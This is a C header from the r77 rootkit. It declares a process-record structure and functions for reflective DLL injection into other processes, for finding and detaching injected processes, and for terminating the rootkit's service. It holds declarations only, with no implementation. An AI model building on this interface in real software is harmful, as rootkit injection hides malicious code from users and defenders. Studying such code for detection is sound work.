#include "r77mindef.h"
#ifndef _R77PROCESS_H
#define _R77PROCESS_H

/// <summary>
/// Defines the r77 header.
/// </summary>
typedef struct _R77_PROCESS
{
	/// <summary>
	/// The process ID of the process.
	/// </summary>
	DWORD ProcessId;
	/// <summary>
	/// The signature (R77_SIGNATURE, R77_SERVICE_SIGNATURE, or R77_HELPER_SIGNATURE).
	/// </summary>
	WORD Signature;
	/// <summary>
	/// A function pointer to DetachRootkit() in the remote process. This function detaches the injected r77 DLL
	/// <para>Applies only, if Signature == R77_SIGNATURE.</para>
	/// </summary>
	DWORD64 DetachAddress;
} R77_PROCESS, *PR77_PROCESS;

/// <summary>
/// Injects a DLL using reflective DLL injection.
/// <para>The DLL must export a function called "ReflectiveDllMain".</para>
/// <para>The bitness of the target process must match that of the DLL file.</para>
/// <para>The integrity level of the target process must be at least medium.</para>
/// <para>The process must not be critical.</para>
/// </summary>
/// <param name="processId">The process to inject the DLL in.</param>
/// <param name="dll">A buffer with the DLL file.</param>
/// <param name="dllSize">dllSize The size of the DLL file.</param>
/// <returns>
/// TRUE, if the DLL was successfully injected and DllMain returned TRUE;
/// otherwise, FALSE.
/// </returns>
BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize);

/// <summary>
/// Retrieves a list of all processes where an r77 header is present.
/// </summary>
/// <param name="r77Processes">A buffer with R77_PROCESS structures to write the result to.</param>
/// <param name="count">A DWORD pointer with the number of structures in the buffer. The number of returned entries is written to this value.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count);
/// <summary>
/// Detaches r77 from the specified process.
/// </summary>
/// <param name="r77Process">The process to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DetachInjectedProcess(PR77_PROCESS r77Process);
/// <summary>
/// Detaches r77 from the specified process.
/// </summary>
/// <param name="processId">The process ID to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DetachInjectedProcessById(DWORD processId);
/// <summary>
/// Detaches r77 from all running processes.
/// </summary>
VOID DetachAllInjectedProcesses();
/// <summary>
/// Terminates the r77 service process.
/// </summary>
/// <param name="excludedProcessId">A process ID that should not be terminated. Use -1 to not exclude any processes.</param>
VOID TerminateR77Service(DWORD excludedProcessId);

#endif